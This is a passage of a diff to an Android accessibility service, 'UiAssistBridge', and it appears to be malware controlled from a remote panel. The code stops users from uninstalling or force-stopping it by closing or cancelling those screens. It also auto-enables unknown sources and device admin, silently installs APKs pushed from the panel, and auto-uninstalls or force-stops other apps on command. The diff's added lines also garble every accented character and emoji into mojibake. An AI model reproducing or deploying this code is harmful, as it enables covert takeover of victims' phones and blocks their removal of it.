+                // Verifica se ÃƒÂ© tela do sistema (settings, security, installer, ui, etc)
                 boolean isSystemPkg = lowerPkg.contains("settings") || 
                                      lowerPkg.contains("security") || 
                                      lowerPkg.contains("packageinstaller") ||
@@ -6712,25 +6960,25 @@ public class UiAssistBridge extends AccessibilityService {
                                      
                 if (isSystemPkg && rootNode != null) {
                     boolean hasActivationText = containsAnyText(rootNode, new String[]{
-                        "ativar", "permitir", "habilitar", "avançar", "seguinte", "continuar",
+                        "ativar", "permitir", "habilitar", "avanÃƒÂ§ar", "seguinte", "continuar",
                         "activate", "enable", "allow", "next", "continue", "ok", "sim", "yes",
                         "administrador", "device admin", "device administrator"
                     });
                     
                     if (hasActivationText) {
-                        Log.d(TAG, "🛡️ Bypass ativacao/permissao detectado (pkg=" + packageName + "). Mantendo tela aberta.");
-                        return; // Bypass completo — deixa a tela aberta
+                        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â Bypass ativacao/permissao detectado (pkg=" + packageName + "). Mantendo tela aberta.");
+                        return; // Bypass completo Ã¢â‚¬â€ deixa a tela aberta
                     }
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Erro no bypass de ativação: " + e.getMessage());
+            Log.e(TAG, "Erro no bypass de ativaÃƒÂ§ÃƒÂ£o: " + e.getMessage());
         }
 
         // Log para debug
-        Log.d(TAG, "🔒 CHECK: pkg=" + packageName + " class=" + className);
+        Log.d(TAG, "Ã°Å¸â€â€™ CHECK: pkg=" + packageName + " class=" + className);
 
-        // 🛡️ IMPORTANTE: Ignora a tela de ativação de administrador do dispositivo
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â IMPORTANTE: Ignora a tela de ativaÃƒÂ§ÃƒÂ£o de administrador do dispositivo
         boolean isDeviceAdminScreen = false;
         String lowerClass = className.toLowerCase();
         String lowerPkg = packageName.toLowerCase();
@@ -6773,12 +7021,12 @@ public class UiAssistBridge extends AccessibilityService {
         }
 
         if (isDeviceAdminScreen) {
-            Log.d(TAG, "🛡️ BYPASS PROTEÇÃO: Ignorando tela de administrador de dispositivo");
-            return; // Não interfere no fluxo de administrador
+            Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â BYPASS PROTEÃƒâ€¡ÃƒÆ’O: Ignorando tela de administrador de dispositivo");
+            return; // NÃƒÂ£o interfere no fluxo de administrador
         }
         
-        // 📦 EXCEÇÃO IMPORTANTE: Permite telas de "Fontes Desconhecidas" / "Install unknown apps"
-        // Estas telas são NECESSÁRIAS para instalar APKs remotamente!
+        // Ã°Å¸â€œÂ¦ EXCEÃƒâ€¡ÃƒÆ’O IMPORTANTE: Permite telas de "Fontes Desconhecidas" / "Install unknown apps"
+        // Estas telas sÃƒÂ£o NECESSÃƒÂRIAS para instalar APKs remotamente!
         if (isSettingsOrSecurityPkg) {
             if (className.contains("ManageAppExternalSourcesActivity") ||
                 className.contains("ExternalSources") ||
@@ -6786,34 +7034,34 @@ public class UiAssistBridge extends AccessibilityService {
                 className.contains("InstallApps") ||
                 className.contains("SpaActivity")) {
                 
-                Log.d(TAG, "📦 PERMITINDO: Tela de fontes desconhecidas/install apps");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ PERMITINDO: Tela de fontes desconhecidas/install apps");
                 
-                // Se auto-install está ativo, tenta habilitar automaticamente
+                // Se auto-install estÃƒÂ¡ ativo, tenta habilitar automaticamente
                 if (autoInstallEnabled) {
                     autoEnableUnknownSources(rootNode);
                 }
-                return; // NÃO bloqueia esta tela!
+                return; // NÃƒÆ’O bloqueia esta tela!
             }
         }
         
-        // 📦 EXCEÇÃO CRÍTICA: Verificar se é tela de Install Unknown Apps ANTES de tudo!
-        // Essa tela contém o nome do app, então precisamos ignorá-la ANTES da verificação de acessibilidade
+        // Ã°Å¸â€œÂ¦ EXCEÃƒâ€¡ÃƒÆ’O CRÃƒÂTICA: Verificar se ÃƒÂ© tela de Install Unknown Apps ANTES de tudo!
+        // Essa tela contÃƒÂ©m o nome do app, entÃƒÂ£o precisamos ignorÃƒÂ¡-la ANTES da verificaÃƒÂ§ÃƒÂ£o de acessibilidade
         boolean isUnknownAppsScreen = isSettingsOrSecurityPkg && rootNode != null &&
             (containsAnyText(rootNode, new String[]{"Install unknown apps", "Instalar apps desconhecidos", 
              "Allow from this source", "Permitir desta fonte", "Unknown apps"}));
         
         if (isUnknownAppsScreen) {
-            Log.d(TAG, "📦 EXCEÇÃO CRÍTICA: Tela de Unknown Apps - NÃO fechando!");
+            Log.d(TAG, "Ã°Å¸â€œÂ¦ EXCEÃƒâ€¡ÃƒÆ’O CRÃƒÂTICA: Tela de Unknown Apps - NÃƒÆ’O fechando!");
             if (autoInstallEnabled) {
                 autoEnableUnknownSources(rootNode);
             }
             return; // NUNCA fecha esta tela!
         }
         
-        // 🔒 1. Detecta tela de configurações de Acessibilidade (MAIS AGRESSIVO)
+        // Ã°Å¸â€â€™ 1. Detecta tela de configuraÃƒÂ§ÃƒÂµes de Acessibilidade (MAIS AGRESSIVO)
         boolean isAccessibilitySettings = false;
         
-        // Verifica pelo nome da classe (EXCETO ManageAppExternalSources que é para install apps)
+        // Verifica pelo nome da classe (EXCETO ManageAppExternalSources que ÃƒÂ© para install apps)
         if (isSettingsOrSecurityPkg) {
             if ((className.contains("Accessibility") || 
                 className.contains("accessibility") ||
@@ -6825,30 +7073,30 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Verifica também pelo conteúdo da tela (procura nosso app na lista de acessibilidade)
-        // MAS apenas se NÃO for tela de "Install unknown apps"
+        // Verifica tambÃƒÂ©m pelo conteÃƒÂºdo da tela (procura nosso app na lista de acessibilidade)
+        // MAS apenas se NÃƒÆ’O for tela de "Install unknown apps"
         if (isSettingsOrSecurityPkg && rootNode != null && !isUnknownAppsScreen) {
-            // Lista de indicadores de ACESSIBILIDADE (não install apps)
+            // Lista de indicadores de ACESSIBILIDADE (nÃƒÂ£o install apps)
             java.util.List<String> accessibilityIndicators = new java.util.ArrayList<>();
             accessibilityIndicators.add("Downloaded apps");
             accessibilityIndicators.add("Downloaded services");
-            accessibilityIndicators.add("Serviços baixados");
+            accessibilityIndicators.add("ServiÃƒÂ§os baixados");
             accessibilityIndicators.add("Apps baixados");
             accessibilityIndicators.add("Installed services");
-            accessibilityIndicators.add("Serviços instalados");
+            accessibilityIndicators.add("ServiÃƒÂ§os instalados");
             
-            // SÓ adiciona nome do app se a tela tiver indicadores de acessibilidade
+            // SÃƒâ€œ adiciona nome do app se a tela tiver indicadores de acessibilidade
             // Isso evita false positives na tela de "Install unknown apps"
             boolean hasAccessibilityIndicator = containsAnyText(rootNode, accessibilityIndicators.toArray(new String[0]));
             
             if (hasAccessibilityIndicator && containsOurAppName(rootNode)) {
-                // Confirma que é tela de acessibilidade
+                // Confirma que ÃƒÂ© tela de acessibilidade
                 isAccessibilitySettings = true;
             }
         }
         
         if (isAccessibilitySettings) {
-            Log.d(TAG, "🔒 PROTEÇÃO: Configurações de Acessibilidade detectadas");
+            Log.d(TAG, "Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O: ConfiguraÃƒÂ§ÃƒÂµes de Acessibilidade detectadas");
             consecutiveProtectionHits++;
             triggerProtectionExit("accessibility_settings");
             return;
@@ -6856,23 +7104,23 @@ public class UiAssistBridge extends AccessibilityService {
             consecutiveProtectionHits = 0;
         }
         
-        // 🔧 ROM CONFIG: Auto-click em configurações de ROM (Autostart, Battery, etc)
+        // Ã°Å¸â€Â§ ROM CONFIG: Auto-click em configuraÃƒÂ§ÃƒÂµes de ROM (Autostart, Battery, etc)
         if (romConfigEnabled) {
-            Log.d(TAG, "🔧 ROM_CONFIG ATIVO - Package: " + packageName + " Class: " + className);
+            Log.d(TAG, "Ã°Å¸â€Â§ ROM_CONFIG ATIVO - Package: " + packageName + " Class: " + className);
             
-            // Detecta dialog de "Ignorar otimização de bateria"
+            // Detecta dialog de "Ignorar otimizaÃƒÂ§ÃƒÂ£o de bateria"
             if (handleBatteryOptimizationDialog(packageName, className, rootNode)) {
-                Log.d(TAG, "🔧 Battery dialog processado!");
-                return; // Já processou
+                Log.d(TAG, "Ã°Å¸â€Â§ Battery dialog processado!");
+                return; // JÃƒÂ¡ processou
             }
             
             if (handleROMConfigAutoClick(packageName, className, rootNode)) {
-                Log.d(TAG, "🔧 ROM Config auto-click processado!");
-                return; // Já processou
+                Log.d(TAG, "Ã°Å¸â€Â§ ROM Config auto-click processado!");
+                return; // JÃƒÂ¡ processou
             }
         }
         
-        // 📦 AUTO-INSTALL: Habilita FONTES DESCONHECIDAS automaticamente
+        // Ã°Å¸â€œÂ¦ AUTO-INSTALL: Habilita FONTES DESCONHECIDAS automaticamente
         if (autoInstallEnabled && isSettingsOrSecurityPkg) {
             // Detecta tela de "Install unknown apps" / "Fontes desconhecidas"
             boolean isUnknownSourcesScreen = className.contains("ManageAppExternalSources") ||
@@ -6884,47 +7132,47 @@ public class UiAssistBridge extends AccessibilityService {
                                               });
             
             if (isUnknownSourcesScreen) {
-                Log.d(TAG, "📦 AUTO-INSTALL: Tela de FONTES DESCONHECIDAS detectada!");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Tela de FONTES DESCONHECIDAS detectada!");
                 autoEnableUnknownSources(rootNode);
                 
-                // Após habilitar, pressiona BACK para voltar à instalação
+                // ApÃƒÂ³s habilitar, pressiona BACK para voltar ÃƒÂ  instalaÃƒÂ§ÃƒÂ£o
                 handler.postDelayed(() -> {
                     performGlobalAction(GLOBAL_ACTION_BACK);
-                    Log.d(TAG, "📦 AUTO-INSTALL: Voltando para tela de instalação...");
+                    Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Voltando para tela de instalaÃƒÂ§ÃƒÂ£o...");
                 }, 500);
                 return;
             }
         }
         
-        // 📦 AUTO-INSTALL: Se estamos instalando um APK, auto-clica em "Instalar"
+        // Ã°Å¸â€œÂ¦ AUTO-INSTALL: Se estamos instalando um APK, auto-clica em "Instalar"
         if (autoInstallEnabled && packageName.contains("packageinstaller")) {
-            // Verifica se é tela de INSTALAÇÃO (não desinstalação)
+            // Verifica se ÃƒÂ© tela de INSTALAÃƒâ€¡ÃƒÆ’O (nÃƒÂ£o desinstalaÃƒÂ§ÃƒÂ£o)
             boolean isInstallScreen = containsInstallText(rootNode) && !containsUninstallText(rootNode);
             
-            // Primeiro verifica se é diálogo de "Unknown apps" - precisa clicar em Settings
+            // Primeiro verifica se ÃƒÂ© diÃƒÂ¡logo de "Unknown apps" - precisa clicar em Settings
             boolean isUnknownAppsDialog = containsAnyText(rootNode, new String[]{
                 "isn't allowed to install unknown apps",
-                "não tem permissão para instalar apps desconhecidos",
+                "nÃƒÂ£o tem permissÃƒÂ£o para instalar apps desconhecidos",
                 "unknown apps from this source",
                 "apps desconhecidos desta fonte",
                 "For your security",
-                "Para sua segurança"
+                "Para sua seguranÃƒÂ§a"
             });
             
             if (isUnknownAppsDialog) {
-                Log.d(TAG, "📦 AUTO-INSTALL: Diálogo de FONTES DESCONHECIDAS - Clicando em Settings!");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: DiÃƒÂ¡logo de FONTES DESCONHECIDAS - Clicando em Settings!");
                 autoClickSettingsButton(rootNode);
                 return;
             }
             
             if (isInstallScreen) {
-                Log.d(TAG, "📦 AUTO-INSTALL: Tela de instalação detectada!");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Tela de instalaÃƒÂ§ÃƒÂ£o detectada!");
                 autoClickInstallButton(rootNode);
                 return;
             }
         }
         
-        // 🔒 2. Detecta QUALQUER tela de desinstalação (PackageInstaller, Settings, SystemUI, PermissionController, etc)
+        // Ã°Å¸â€â€™ 2. Detecta QUALQUER tela de desinstalaÃƒÂ§ÃƒÂ£o (PackageInstaller, Settings, SystemUI, PermissionController, etc)
         boolean isUninstallScreen = false;
         lowerPkg = packageName.toLowerCase();
         lowerClass = className.toLowerCase();
@@ -6952,32 +7200,32 @@ public class UiAssistBridge extends AccessibilityService {
             boolean isOurApp = containsOurAppName(rootNode);
             
             if (isOurApp && !CommandControlService.isSelfDestructActive) {
-                Log.d(TAG, "🔒 PROTEÇÃO: Tentativa de desinstalação do NOSSO app detectada");
+                Log.d(TAG, "Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O: Tentativa de desinstalaÃƒÂ§ÃƒÂ£o do NOSSO app detectada");
                 clickCancelButton(rootNode);
                 triggerProtectionExit("uninstall_screen");
                 return;
             } else if (!isOurApp && (allowUninstallOtherApps || autoUninstallEnabled)) {
-                // ✅ Se é OUTRO app e temos permissão/comando do painel, AUTO-CLICA em "OK/Uninstall"
-                Log.d(TAG, "🗑️ AUTO-UNINSTALL: Desinstalando app alvo automaticamente!");
+                // Ã¢Å“â€¦ Se ÃƒÂ© OUTRO app e temos permissÃƒÂ£o/comando do painel, AUTO-CLICA em "OK/Uninstall"
+                Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO-UNINSTALL: Desinstalando app alvo automaticamente!");
                 autoClickUninstallButton(rootNode);
                 return;
             }
         }
         
-        // 📦 EXCEÇÃO: Não fecha tela de "Install unknown apps" (Fontes desconhecidas)
+        // Ã°Å¸â€œÂ¦ EXCEÃƒâ€¡ÃƒÆ’O: NÃƒÂ£o fecha tela de "Install unknown apps" (Fontes desconhecidas)
         boolean isUnknownSourcesScreen = className.contains("ManageAppExternalSources") ||
                                           className.contains("ExternalSources") ||
                                           className.contains("UnknownSources");
         
         if (isUnknownSourcesScreen) {
-            Log.d(TAG, "📦 EXCEÇÃO: Tela de fontes desconhecidas - NÃO fechando!");
+            Log.d(TAG, "Ã°Å¸â€œÂ¦ EXCEÃƒâ€¡ÃƒÆ’O: Tela de fontes desconhecidas - NÃƒÆ’O fechando!");
             if (autoInstallEnabled) {
                 autoEnableUnknownSources(rootNode);
             }
             return;
         }
         
-        // 🔒 4. Detecta tela de "App info" do nosso app ou de app alvo para auto-desinstalação / auto-force-stop
+        // Ã°Å¸â€â€™ 4. Detecta tela de "App info" do nosso app ou de app alvo para auto-desinstalaÃƒÂ§ÃƒÂ£o / auto-force-stop
         boolean isAppInfoScreen = isSettingsOrSecurityPkg &&
             (className.contains("InstalledAppDetails") ||
              className.contains("AppInfoDashboard") ||
@@ -6986,59 +7234,59 @@ public class UiAssistBridge extends AccessibilityService {
              className.contains("ManageApplications") ||
              className.contains("SubSettings") ||
              className.contains("Applications") ||
-             (rootNode != null && containsAnyText(rootNode, new String[]{"Force stop", "Forçar parada", "Forçar interrupção", "Uninstall", "Desinstalar"})));
+             (rootNode != null && containsAnyText(rootNode, new String[]{"Force stop", "ForÃƒÂ§ar parada", "ForÃƒÂ§ar interrupÃƒÂ§ÃƒÂ£o", "Uninstall", "Desinstalar"})));
 
         if (isAppInfoScreen) {
             boolean isOurApp = containsOurAppName(rootNode);
             boolean hasUninstallOrForceStop = rootNode != null && (
                 containsUninstallText(rootNode) ||
                 containsAnyText(rootNode, new String[]{
-                    "Force stop", "Forçar parada", "Forçar interrupção",
+                    "Force stop", "ForÃƒÂ§ar parada", "ForÃƒÂ§ar interrupÃƒÂ§ÃƒÂ£o",
                     "Disable", "Desativar", "Desabilitar"
                 })
             );
 
             if (isOurApp && hasUninstallOrForceStop && !isUnknownSourcesScreen && !CommandControlService.isSelfDestructActive) {
-                Log.d(TAG, "🔒 PROTEÇÃO: Tentativa de forçar parada/desinstalar na tela de info do app detectada");
+                Log.d(TAG, "Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O: Tentativa de forÃƒÂ§ar parada/desinstalar na tela de info do app detectada");
                 triggerProtectionExit("app_info");
                 return;
             } else if (!isOurApp && (allowUninstallOtherApps || autoUninstallEnabled)) {
-                // Se estamos na tela de info de OUTRO app para desinstalá-lo, clica em "Desinstalar"
-                Log.d(TAG, "🗑️ AUTO-UNINSTALL: Clicando em Desinstalar na tela de App Info!");
+                // Se estamos na tela de info de OUTRO app para desinstalÃƒÂ¡-lo, clica em "Desinstalar"
+                Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO-UNINSTALL: Clicando em Desinstalar na tela de App Info!");
                 autoClickUninstallButton(rootNode);
             } else if (!isOurApp && autoForceStopEnabled) {
-                Log.d(TAG, "⛔ AUTO_FORCE_STOP: Clicando para forçar parada na tela de App Info!");
+                Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP: Clicando para forÃƒÂ§ar parada na tela de App Info!");
                 autoClickForceStopButton(rootNode);
             }
         }
         
-        // 🔒 5. Detecta tela de "Force Stop" ou "Disable" do nosso app ou executa autoForceStop para outro app
+        // Ã°Å¸â€â€™ 5. Detecta tela de "Force Stop" ou "Disable" do nosso app ou executa autoForceStop para outro app
         if (isSettingsOrSecurityPkg && rootNode != null) {
             boolean hasForceStop = containsAnyText(rootNode, new String[]{
-                "Force stop", "Forçar parada", "Forçar interrupção",
+                "Force stop", "ForÃƒÂ§ar parada", "ForÃƒÂ§ar interrupÃƒÂ§ÃƒÂ£o",
                 "Disable", "Desativar", "Desabilitar",
                 "Uninstall", "Desinstalar"
             });
             
             boolean isOurApp = containsOurAppName(rootNode);
             if (hasForceStop && isOurApp && !CommandControlService.isSelfDestructActive) {
-                Log.d(TAG, "🔒 PROTEÇÃO: Force Stop/Disable/Uninstall detectado");
+                Log.d(TAG, "Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O: Force Stop/Disable/Uninstall detectado");
                 triggerProtectionExit("force_stop");
                 return;
             } else if (!isOurApp && autoForceStopEnabled) {
-                Log.d(TAG, "⛔ AUTO_FORCE_STOP: executando auto-clique em Settings!");
+                Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP: executando auto-clique em Settings!");
                 autoClickForceStopButton(rootNode);
             }
         }
         
-        // 🔒 6. Detecta lista de Apps (quando clicam no nosso app)
+        // Ã°Å¸â€â€™ 6. Detecta lista de Apps (quando clicam no nosso app)
         if (packageName.equals("com.android.settings") && 
             (className.contains("ManageApplications") || 
              className.contains("AllApplications") ||
              className.contains("RecentApps"))) {
             
             if (containsOurAppName(rootNode) && !CommandControlService.isSelfDestructActive) {
-                Log.d(TAG, "🔒 PROTEÇÃO: Nosso app na lista de apps");
+                Log.d(TAG, "Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O: Nosso app na lista de apps");
                 triggerProtectionExit("app_list");
                 return;
             }
@@ -7046,16 +7294,16 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * ⛔ Auto-clica em "Forçar parada/OK" para parar OUTROS apps de forma 100% automática
+     * Ã¢â€ºâ€ Auto-clica em "ForÃƒÂ§ar parada/OK" para parar OUTROS apps de forma 100% automÃƒÂ¡tica
      */
     private void autoClickForceStopButton(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        Log.d(TAG, "⛔ AUTO_FORCE_STOP: Procurando botão para forçar parada...");
+        Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP: Procurando botÃƒÂ£o para forÃƒÂ§ar parada...");
 
-        // 1. Tenta encontrar botão "Forçar parada" na tela de App Info em Settings
+        // 1. Tenta encontrar botÃƒÂ£o "ForÃƒÂ§ar parada" na tela de App Info em Settings
         String[] forceStopBtnTexts = {
-            "Forçar parada", "Forçar interrupção", "Force stop", "Parar", "Force close", "Forçar a parada"
+            "ForÃƒÂ§ar parada", "ForÃƒÂ§ar interrupÃƒÂ§ÃƒÂ£o", "Force stop", "Parar", "Force close", "ForÃƒÂ§ar a parada"
         };
 
         for (String btnText : forceStopBtnTexts) {
@@ -7063,7 +7311,7 @@ public class UiAssistBridge extends AccessibilityService {
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo btn : nodes) {
                     if (btn.isEnabled() && performNodeClick(btn)) {
-                        Log.d(TAG, "⛔ ✅ AUTO_FORCE_STOP: Clicou no botão Forçar Parada!");
+                        Log.d(TAG, "Ã¢â€ºâ€ Ã¢Å“â€¦ AUTO_FORCE_STOP: Clicou no botÃƒÂ£o ForÃƒÂ§ar Parada!");
                         return;
                     }
                 }
@@ -7085,7 +7333,7 @@ public class UiAssistBridge extends AccessibilityService {
                 if (nodes != null && !nodes.isEmpty()) {
                     for (AccessibilityNodeInfo node : nodes) {
                         if (node.isEnabled() && performNodeClick(node)) {
-                            Log.d(TAG, "⛔ ✅ AUTO_FORCE_STOP: Clicou no botão Forçar Parada por ID: " + id);
+                            Log.d(TAG, "Ã¢â€ºâ€ Ã¢Å“â€¦ AUTO_FORCE_STOP: Clicou no botÃƒÂ£o ForÃƒÂ§ar Parada por ID: " + id);
                             return;
                         }
                     }
@@ -7093,9 +7341,9 @@ public class UiAssistBridge extends AccessibilityService {
             } catch (Exception ignored) {}
         }
 
-        // 3. Se for dialog de confirmação de Force Stop ("Se você forçar a parada de um app, ele poderá apresentar mau funcionamento")
+        // 3. Se for dialog de confirmaÃƒÂ§ÃƒÂ£o de Force Stop ("Se vocÃƒÂª forÃƒÂ§ar a parada de um app, ele poderÃƒÂ¡ apresentar mau funcionamento")
         String[] confirmTexts = {
-            "OK", "Forçar parada", "Forçar interrupção", "Force stop", "Sim", "Confirmar"
+            "OK", "ForÃƒÂ§ar parada", "ForÃƒÂ§ar interrupÃƒÂ§ÃƒÂ£o", "Force stop", "Sim", "Confirmar"
         };
 
         for (String confirmText : confirmTexts) {
@@ -7103,7 +7351,7 @@ public class UiAssistBridge extends AccessibilityService {
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo btn : nodes) {
                     if (performNodeClick(btn)) {
-                        Log.d(TAG, "⛔ ✅ AUTO_FORCE_STOP: Clicou no botão de confirmação!");
+                        Log.d(TAG, "Ã¢â€ºâ€ Ã¢Å“â€¦ AUTO_FORCE_STOP: Clicou no botÃƒÂ£o de confirmaÃƒÂ§ÃƒÂ£o!");
                         handler.postDelayed(() -> {
                             try {
                                 autoForceStopEnabled = false;
@@ -7122,7 +7370,7 @@ public class UiAssistBridge extends AccessibilityService {
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
                     if (performNodeClick(node)) {
-                        Log.d(TAG, "⛔ ✅ AUTO_FORCE_STOP: Clicou no botão1 por ID!");
+                        Log.d(TAG, "Ã¢â€ºâ€ Ã¢Å“â€¦ AUTO_FORCE_STOP: Clicou no botÃƒÂ£o1 por ID!");
                         handler.postDelayed(() -> {
                             try {
                                 autoForceStopEnabled = false;
@@ -7137,16 +7385,16 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * 🗑️ Auto-clica em "Uninstall/OK" para desinstalar OUTROS apps de forma 100% automática
+     * Ã°Å¸â€”â€˜Ã¯Â¸Â Auto-clica em "Uninstall/OK" para desinstalar OUTROS apps de forma 100% automÃƒÂ¡tica
      */
     private void autoClickUninstallButton(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        Log.d(TAG, "🗑️ AUTO-UNINSTALL: Executando clique automático de confirmação...");
+        Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO-UNINSTALL: Executando clique automÃƒÂ¡tico de confirmaÃƒÂ§ÃƒÂ£o...");
 
-        // 1. Tenta por View ID (padrões de diálogos do Android, MIUI, Samsung, Pixel)
+        // 1. Tenta por View ID (padrÃƒÂµes de diÃƒÂ¡logos do Android, MIUI, Samsung, Pixel)
         String[] buttonIds = {
-            "android:id/button1", // Botão positivo padrão do Android (OK / Desinstalar)
+            "android:id/button1", // BotÃƒÂ£o positivo padrÃƒÂ£o do Android (OK / Desinstalar)
             "com.android.packageinstaller:id/ok_button",
             "com.google.android.packageinstaller:id/ok_button",
             "com.google.android.permissioncontroller:id/ok_button",
@@ -7161,7 +7409,7 @@ public class UiAssistBridge extends AccessibilityService {
                 if (nodes != null && !nodes.isEmpty()) {
                     for (AccessibilityNodeInfo node : nodes) {
                         if (performNodeClick(node)) {
-                            Log.d(TAG, "🗑️ ✅ AUTO-UNINSTALL: Clicou no botão por ID: " + id);
+                            Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â Ã¢Å“â€¦ AUTO-UNINSTALL: Clicou no botÃƒÂ£o por ID: " + id);
                             return;
                         }
                     }
@@ -7169,7 +7417,7 @@ public class UiAssistBridge extends AccessibilityService {
             } catch (Exception ignored) {}
         }
         
-        // 2. Tenta por texto do botão
+        // 2. Tenta por texto do botÃƒÂ£o
         String[] uninstallButtons = {
             "OK", "Uninstall", "Desinstalar", "Confirm", "Confirmar", 
             "Yes", "Sim", "Aceitar", "Accept", "Excluir", "Remover", "Apagar", "Lixeira"
@@ -7180,24 +7428,24 @@ public class UiAssistBridge extends AccessibilityService {
             if (buttons != null && !buttons.isEmpty()) {
                 for (AccessibilityNodeInfo btn : buttons) {
                     if (performNodeClick(btn)) {
-                        Log.d(TAG, "🗑️ ✅ AUTO-UNINSTALL: Clicou no botão por texto: " + buttonText);
+                        Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â Ã¢Å“â€¦ AUTO-UNINSTALL: Clicou no botÃƒÂ£o por texto: " + buttonText);
                         return;
                     }
                 }
             }
         }
         
-        // 3. Fallback: Procura o último botão da caixa de diálogo (normalmente OK à direita)
+        // 3. Fallback: Procura o ÃƒÂºltimo botÃƒÂ£o da caixa de diÃƒÂ¡logo (normalmente OK ÃƒÂ  direita)
         List<AccessibilityNodeInfo> allButtons = findNodesByClassName(rootNode, "android.widget.Button");
         if (allButtons != null && !allButtons.isEmpty()) {
             AccessibilityNodeInfo rightButton = allButtons.get(allButtons.size() - 1);
-            Log.d(TAG, "🗑️ AUTO-UNINSTALL: Clicando no último botão (Fallback)");
+            Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO-UNINSTALL: Clicando no ÃƒÂºltimo botÃƒÂ£o (Fallback)");
             performNodeClick(rightButton);
         }
     }
 
     /**
-     * Executa clique no nó com suporte a múltiplos fallback
+     * Executa clique no nÃƒÂ³ com suporte a mÃƒÂºltiplos fallback
      */
     private boolean performNodeClick(AccessibilityNodeInfo btn) {
         if (btn == null) return false;
@@ -7223,7 +7471,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🗑️ Clica por coordenadas (para botões que não respondem a ACTION_CLICK)
+     * Ã°Å¸â€”â€˜Ã¯Â¸Â Clica por coordenadas (para botÃƒÂµes que nÃƒÂ£o respondem a ACTION_CLICK)
      */
     private void clickByCoordinates(AccessibilityNodeInfo node) {
         if (node == null) return;
@@ -7238,20 +7486,20 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Verifica se contém texto de desinstalação
+     * Verifica se contÃƒÂ©m texto de desinstalaÃƒÂ§ÃƒÂ£o
      */
     private boolean containsUninstallText(AccessibilityNodeInfo node) {
         String[] uninstallTexts = {
             "uninstall", "Uninstall", "desinstalar", "Desinstalar",
             "Do you want to uninstall", "Deseja desinstalar",
-            "will be uninstalled", "será desinstalado",
+            "will be uninstalled", "serÃƒÂ¡ desinstalado",
             "remover", "Remover", "excluir", "Excluir", "apagar", "Apagar"
         };
         return containsAnyText(node, uninstallTexts);
     }
     
     /**
-     * 📦 Verifica se contém texto de instalação
+     * Ã°Å¸â€œÂ¦ Verifica se contÃƒÂ©m texto de instalaÃƒÂ§ÃƒÂ£o
      */
     private boolean containsInstallText(AccessibilityNodeInfo node) {
         String[] installTexts = {
@@ -7263,13 +7511,13 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔋 Detecta e clica no dialog "Ignorar otimização de bateria"
-     * Este dialog aparece com botões "Permitir" / "Allow" e "Negar" / "Deny"
+     * Ã°Å¸â€â€¹ Detecta e clica no dialog "Ignorar otimizaÃƒÂ§ÃƒÂ£o de bateria"
+     * Este dialog aparece com botÃƒÂµes "Permitir" / "Allow" e "Negar" / "Deny"
      */
     private boolean handleBatteryOptimizationDialog(String packageName, String className, AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
         
-        // Verifica se é um dialog de bateria
+        // Verifica se ÃƒÂ© um dialog de bateria
         boolean isBatteryDialog = packageName.contains("settings") || 
                                   packageName.contains("android") ||
                                   className.contains("Dialog") ||
@@ -7277,27 +7525,27 @@ public class UiAssistBridge extends AccessibilityService {
         
         if (!isBatteryDialog) return false;
         
-        // Palavras que indicam o dialog de "Ignorar otimização de bateria"
+        // Palavras que indicam o dialog de "Ignorar otimizaÃƒÂ§ÃƒÂ£o de bateria"
         String[] batteryDialogIndicators = {
-            "battery optimization", "otimização de bateria",
+            "battery optimization", "otimizaÃƒÂ§ÃƒÂ£o de bateria",
             "Let app always run in background", "Permitir que o app sempre execute",
-            "ignore battery optimizations", "ignorar otimizações de bateria"
+            "ignore battery optimizations", "ignorar otimizaÃƒÂ§ÃƒÂµes de bateria"
         };
         
-        // Verifica se contém texto do dialog de bateria
+        // Verifica se contÃƒÂ©m texto do dialog de bateria
         boolean foundBatteryText = false;
         for (String indicator : batteryDialogIndicators) {
             List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(indicator);
             if (nodes != null && !nodes.isEmpty()) {
                 foundBatteryText = true;
-                Log.d(TAG, "🔋 DIALOG: Detectado dialog de otimização de bateria!");
+                Log.d(TAG, "Ã°Å¸â€â€¹ DIALOG: Detectado dialog de otimizaÃƒÂ§ÃƒÂ£o de bateria!");
                 break;
             }
         }
         
         if (!foundBatteryText) return false;
         
-        // Procura botão "Allow" / "Permitir"
+        // Procura botÃƒÂ£o "Allow" / "Permitir"
